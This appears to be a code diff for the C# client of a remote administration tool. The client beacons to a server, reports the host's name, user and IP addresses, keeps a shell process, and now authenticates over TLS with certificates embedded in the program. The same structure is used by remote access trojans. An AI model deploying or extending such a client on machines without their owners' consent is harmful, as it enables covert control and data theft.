@@ -6,18 +6,21 @@ using System.Linq;
 using System.Net;
 using System.Net.Http;
 using System.Net.Sockets;
+using System.Reflection;
+using System.Security.Cryptography.X509Certificates;
 using System.Text;
 using System.Threading.Tasks;
 using RemoteAdmin.Client.Config;
 using RemoteAdmin.Client.Modules;
 using RemoteAdmin.Shared;
+using System.Net.Security;
 
 
 namespace RemoteAdmin.Client.Networking
 {
     public class ConnectionManager
     {
-        private static Process shellProcess;
+        private static Process? shellProcess;
 
         static readonly HttpClient PublicIpHttp = new HttpClient(
         new HttpClientHandler { Proxy = null, UseProxy = false })
@@ -30,6 +33,9 @@ namespace RemoteAdmin.Client.Networking
             Console.WriteLine($"Server: {ClientConfig.ServerIP}:{ClientConfig.ServerPort}");
             Console.WriteLine($"Reconnect Delay: {ClientConfig.ReconnectInterval}s");
 
+            var clientCert = RemoteAdmin.Client.Certificates.EmbeddedLoader.LoadClientCertificate();
+            var caCert = RemoteAdmin.Client.Certificates.EmbeddedLoader.LoadCaCertificate();
+
             while (true)
             {
                 try
@@ -39,34 +45,39 @@ namespace RemoteAdmin.Client.Networking
                         await tcpClient.ConnectAsync(ClientConfig.ServerIP, ClientConfig.ServerPort);
                         Console.WriteLine("Connected to server!");
 
-                        using (var stream = tcpClient.GetStream())
+                        // Wrap TCP stream in TLS
+                        var networkStream = tcpClient.GetStream();
+                        var sslStream = await NetworkHelper.CreateClientSslStreamAsync(
+                            networkStream, clientCert, caCert, "RemoteAdmin Server");
+
+                        Console.WriteLine("✓ Secure TLS connection established!");
+
+                        // Get local IP
+                        var ep = (System.Net.IPEndPoint?)tcpClient.Client.LocalEndPoint;
+                        var ip = ep?.Address;
+                        if (ip.IsIPv4MappedToIPv6) ip = ip.MapToIPv4();
+
+                        var clientInfo = new ClientInfoMessage
                         {
-                            var ep = (System.Net.IPEndPoint)tcpClient.Client.LocalEndPoint;
-                            var ip = ep.Address;
-                            if (ip.IsIPv4MappedToIPv6) ip = ip.MapToIPv4();
+                            ComputerName = Environment.MachineName,
+                            Username = Environment.UserName,
+                            OSVersion = Environment.OSVersion.ToString(),
+                            IPAddress = ip.ToString(),
+                            PublicIP = await GetPublicIPAsync()
+                        };
 
-                            var clientInfo = new ClientInfoMessage
+                        await NetworkHelper.SendMessageAsync(sslStream, clientInfo);
+                        Console.WriteLine("Sent client info to server");
+
+                        _ = Task.Run(async () => await ListenForMessages(sslStream));
+
+                        while (tcpClient.Connected)
+                        {
+                            await Task.Delay(10000);
+
+                            if (tcpClient.Connected)
                             {
-                                ComputerName = Environment.MachineName,
-                                Username = Environment.UserName,
-                                OSVersion = Environment.OSVersion.ToString(),
-                                IPAddress = ip.ToString(),
-                                PublicIP = await GetPublicIPAsync()
-                            };
-
-                            await NetworkHelper.SendMessageAsync(stream, clientInfo);
-                            Console.WriteLine("Sent client info to server");
-
-                            _ = Task.Run(async () => await ListenForMessages(stream));
-
-                            while (tcpClient.Connected)
-                            {
-                                await Task.Delay(10000);
-
-                                if (tcpClient.Connected)
-                                {
-                                    await NetworkHelper.SendMessageAsync(stream, new HeartbeatMessage());
-                                }
+                                await NetworkHelper.SendMessageAsync(sslStream, new HeartbeatMessage());
                             }
                         }
                     }
@@ -75,15 +86,31 @@ namespace RemoteAdmin.Client.Networking
                 {
                     Console.WriteLine($"Connection error: {ex.Message}");
                     Console.WriteLine($"Reconnecting in {ClientConfig.ReconnectInterval} seconds...");
-
-                    if (shellProcess != null && !shellProcess.HasExited)
-                    {
-                        shellProcess.Kill();
-                        shellProcess = null;
-                    }
-
                     await Task.Delay(ClientConfig.ReconnectInterval * 1000);
                 }
+            }
+        }
+
+        private static X509Certificate2 LoadEmbeddedCertificate(string resourceName, string password)
+        {
+            var assembly = Assembly.GetExecutingAssembly();
+            using var stream = assembly.GetManifestResourceStream(resourceName);
+
+            if (stream == null)
+                throw new Exception($"Certificate not found: {resourceName}");
+
+            byte[] certData = new byte[stream.Length];
+            stream.Read(certData, 0, certData.Length);
+
+            if (password == null)
+            {
+                // For .crt files (public cert only, no password)
+                return new X509Certificate2(certData);
+            }
+            else
+            {
+                // For .pfx files (with private key)
+                return new X509Certificate2(certData, password, X509KeyStorageFlags.Exportable);
             }
         }
         static async Task<string> GetPublicIPAsync()
@@ -137,7 +164,7 @@ namespace RemoteAdmin.Client.Networking
             return true;
         }
 
-        public static async Task ListenForMessages(NetworkStream stream)
+        public static async Task ListenForMessages(Stream stream)
         {
             try
             {
